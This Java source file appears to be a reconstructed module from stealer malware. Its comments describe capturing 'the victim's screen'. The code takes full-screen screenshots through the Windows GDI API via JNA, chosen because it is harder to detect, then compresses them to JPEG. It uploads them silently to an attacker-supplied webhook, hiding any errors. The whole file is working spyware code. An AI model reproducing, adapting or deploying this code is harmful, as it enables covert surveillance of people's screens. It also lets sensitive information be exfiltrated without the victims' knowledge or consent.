import com.sun.jna.Memory;
import com.sun.jna.platform.win32.GDI32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinGDI;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import javax.imageio.IIOImage;
import javax.imageio.ImageWriter;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageIO;

/**
 * Screenshot Capture
 * Obfuscated name: ҡ (U+04A1)
 *
 * Captures screenshots of the victim's screen using Windows GDI API via JNA.
 * Uses GDI32 (Graphics Device Interface) for low-level screen capture,
 * which is harder to detect than java.awt.Robot.
 *
 * Capture method:
 * 1. Get desktop window handle (GetDesktopWindow)
 * 2. Get device context (GetDC)
 * 3. Create compatible DC and bitmap (CreateCompatibleDC, CreateCompatibleBitmap)
 * 4. BitBlt to copy screen pixels to bitmap
 * 5. Convert to BufferedImage
 * 6. Compress as JPEG (quality ~0.7)
 * 7. Return as byte array
 *
 * Output:
 * - JPEG compressed screenshot
 * - Sent to webhook as file attachment
 * - Filename: screenshot_[timestamp].jpg
 *
 * The static String field `b` likely contains "PNG" or "JPEG" (image format).
 */
public class ScreenshotCapture {

    // Image format (PNG or JPEG)
    private static final String IMAGE_FORMAT;

    // =========================================================
    // CAPTURE
    // =========================================================

    /**
     * Captures the entire screen and returns as JPEG bytes.
     *
     * @return JPEG-compressed screenshot bytes, or null on failure
     */
    public static byte[] captureScreen() {
        try {
            // Get screen dimensions
            int screenWidth = User32.INSTANCE.GetSystemMetrics(0);  // SM_CXSCREEN
            int screenHeight = User32.INSTANCE.GetSystemMetrics(1); // SM_CYSCREEN

            // Get desktop device context
            com.sun.jna.platform.win32.WinDef.HWND desktopHwnd =
                User32.INSTANCE.GetDesktopWindow();
            com.sun.jna.platform.win32.WinDef.HDC desktopDC =
                User32.INSTANCE.GetDC(desktopHwnd);

            // Create compatible DC and bitmap
            com.sun.jna.platform.win32.WinDef.HDC memDC =
                GDI32.INSTANCE.CreateCompatibleDC(desktopDC);
            com.sun.jna.platform.win32.WinDef.HBITMAP bitmap =
                GDI32.INSTANCE.CreateCompatibleBitmap(desktopDC, screenWidth, screenHeight);

            // Select bitmap into memory DC
            GDI32.INSTANCE.SelectObject(memDC, bitmap);

            // Copy screen to bitmap (BitBlt)
            GDI32.INSTANCE.BitBlt(
                memDC, 0, 0, screenWidth, screenHeight,
                desktopDC, 0, 0,
                0x00CC0020  // SRCCOPY
            );

            // Convert bitmap to BufferedImage
            WinGDI.BITMAPINFO bitmapInfo = new WinGDI.BITMAPINFO();
            bitmapInfo.bmiHeader.biWidth = screenWidth;
            bitmapInfo.bmiHeader.biHeight = -screenHeight; // Negative = top-down
            bitmapInfo.bmiHeader.biPlanes = 1;
            bitmapInfo.bmiHeader.biBitCount = 32;
            bitmapInfo.bmiHeader.biCompression = WinGDI.BI_RGB;

            Memory buffer = new Memory(screenWidth * screenHeight * 4);
            GDI32.INSTANCE.GetDIBits(
                memDC, bitmap, 0, screenHeight,
                buffer, bitmapInfo, WinGDI.DIB_RGB_COLORS
            );

            // Build BufferedImage from pixel data
            BufferedImage image = new BufferedImage(
                screenWidth, screenHeight, BufferedImage.TYPE_INT_RGB
            );
            int[] pixels = new int[screenWidth * screenHeight];
            for (int i = 0; i < pixels.length; i++) {
                int b = buffer.getByte(i * 4L) & 0xFF;
                int g = buffer.getByte(i * 4L + 1) & 0xFF;
                int r = buffer.getByte(i * 4L + 2) & 0xFF;
                pixels[i] = (r << 16) | (g << 8) | b;
            }
            image.setRGB(0, 0, screenWidth, screenHeight, pixels, 0, screenWidth);

            // Cleanup GDI resources
            GDI32.INSTANCE.DeleteObject(bitmap);
            GDI32.INSTANCE.DeleteDC(memDC);
            User32.INSTANCE.ReleaseDC(desktopHwnd, desktopDC);

            // Compress as JPEG
            return compressAsJpeg(image, 0.7f);

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Compresses a BufferedImage as JPEG with specified quality.
     *
     * @param image Image to compress
     * @param quality JPEG quality (0.0 - 1.0)
     * @return JPEG bytes
     */
    private static byte[] compressAsJpeg(BufferedImage image, float quality) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ImageWriter writer = ImageIO.getImageWritersByFormatName("JPEG").next();
        ImageWriteParam params = writer.getDefaultWriteParam();
        params.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
        params.setCompressionQuality(quality);

        writer.setOutput(ImageIO.createImageOutputStream(baos));
        writer.write(null, new IIOImage(image, null, null), params);
        writer.dispose();

        return baos.toByteArray();
    }

    /**
     * Captures screen and sends to webhook.
     *
     * @param webhookUrl Webhook URL to send screenshot to
     */
    public static void captureAndSend(String webhookUrl) {
        try {
            byte[] screenshot = captureScreen();
            if (screenshot == null) return;

            String filename = "screenshot_" + System.currentTimeMillis() + ".jpg";
            new HttpUploader(webhookUrl).uploadFile(filename, screenshot, "📸 Screenshot");

        } catch (Exception e) {
            // Silently fail
        }
    }

    static {
        IMAGE_FORMAT = "JPEG";
    }
}
